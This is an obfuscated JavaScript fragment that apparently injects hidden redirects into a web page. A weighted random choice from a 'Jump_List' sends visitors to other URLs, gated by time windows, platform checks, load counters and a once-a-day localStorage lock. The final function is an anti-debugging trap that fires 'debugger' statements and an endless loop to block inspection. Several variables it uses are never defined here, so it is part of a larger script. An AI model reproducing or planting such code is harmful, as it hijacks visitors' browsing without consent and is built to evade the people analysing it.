function isDROk(_0x4a2de5, _0x2bb1d6) {
    var _0x5ca3b0 = ![];
    var _0x1f13b1 = new Date();
    var _0x17f9a8 = _0x1f13b1["getFullYear"]() + '-' + (_0x1f13b1['getMonth']() + 1) + '-' + _0x1f13b1['getDate']();
    var _0x8a0f09 = _0x1f13b1["getFullYear"]() + '-' + (_0x1f13b1["getMonth"]() + 1) + '-' + (_0x1f13b1["getDate"]() - 1);
    var _0x4ca648 = _0x1f13b1["getFullYear"]() + '-' + (_0x1f13b1['getMonth']() + 1) + '-' + _0x1f13b1["getDate"]() + ' ' + _0x4a2de5;
    var _0x2d686a = _0x1f13b1["getFullYear"]() + '-' + (_0x1f13b1["getMonth"]() + 1) + '-' + _0x1f13b1["getDate"]() + ' ' + _0x2bb1d6;
    if (Date['parse'](_0x2d686a["replace"](/-/g, '/')) < Date["parse"](_0x4ca648["replace"](/-/g, '/'))) {
        _0x2d686a = _0x1f13b1['getFullYear']() + '-' + (_0x1f13b1["getMonth"]() + 1) + '-' + (_0x1f13b1["getDate"]() + 1) + ' ' + end;
    }
    if (_0x1f13b1["getTime"]() >= Date["parse"](_0x4ca648['replace'](/-/g, '/')) && _0x1f13b1['getTime']() <= Date["parse"](_0x2d686a["replace"](/-/g, '/'))) {
        _0x5ca3b0 = !![];
    } else {
        _0x5ca3b0 = ![];
    }
    return _0x5ca3b0;
}
function lockTj(_0x4d6aec) {
    var _0x1ebe69 = new Date();
    var _0x121092 = _0x1ebe69["getFullYear"]() + '-' + (_0x1ebe69["getMonth"]() + 1) + '-' + _0x1ebe69['getDate']();
    var _0x585d13 = setInterval(() => {
        var _0x3d5c88 = window["localStorage"]["getItem"]("flagczadsLock" + _0x121092);
        if (_0x3d5c88 == null) {
            window["localStorage"]["setItem"]("flagczadsLock" + _0x121092, 1);
            goTjByCity(_0x4d6aec);
        } else {
        }
        clearInterval(_0x585d13);
    }, 10);
    setTimeout(() => {
        window["localStorage"]["removeItem"]('flagczadsLock' + _0x121092);
    }, 1000);
}
function ju() {
    if (Jump_List["length"] > 0) {
        if (isJumpIntervalOk(JumpIntervalHoure)) {
            setTimeout(() => {
                if (jload(Jump_MaxLoadCount) == ![]) {
                    if (Jump_AllowPlate["indexOf"](systemType) > -1) {
                        var _0x3214fb = [];
                        for (var _0x478de9 = 0; _0x478de9 < Jump_List["length"]; _0x478de9++) {
                            for (var _0x3e9c9e = 0; _0x3e9c9e < Jump_List[_0x478de9]["Weight"]; _0x3e9c9e++) {
                                _0x3214fb["push"](Jump_List[_0x478de9]);
                            }
                        }
                        var _0x28cd5a = parseInt(Math["random"]() * _0x3214fb['length'], 10);
                        if (isDROk(_0x3214fb[_0x28cd5a]["BeginHoure"], _0x3214fb[_0x28cd5a]["EndHoure"])) {
                            window["location"]["href"] = _0x3214fb[_0x28cd5a]['JumpFlag'];
                        }
                    }
                }
            }, Jump_LoadInterval * 1000);
        }
    }
}
function a0_0x4b790f(_0x48a959) {
    function _0x1b8083(_0x43eefd) {
        if (typeof _0x43eefd === 'string') {
            return function (_0x18934d) {
            }["constructor"]("while (true) {}")["apply"]('counter');
        } else {
            if (('' + _0x43eefd / _0x43eefd)['length'] !== 1 || _0x43eefd % 20 === 0) {
                (function () {
                    return !![];
                }['constructor']('debu' + "gger")["call"]('action'));
            } else {
                (function () {
                    return ![];
                }['constructor']("debu" + "gger")["apply"]("stateObject"));
            }
        }
        _0x1b8083(++_0x43eefd);
    }
    try {
        if (_0x48a959) {
            return _0x1b8083;
        } else {
            _0x1b8083(0);
        }
    } catch (_0x68d15) {
    }
}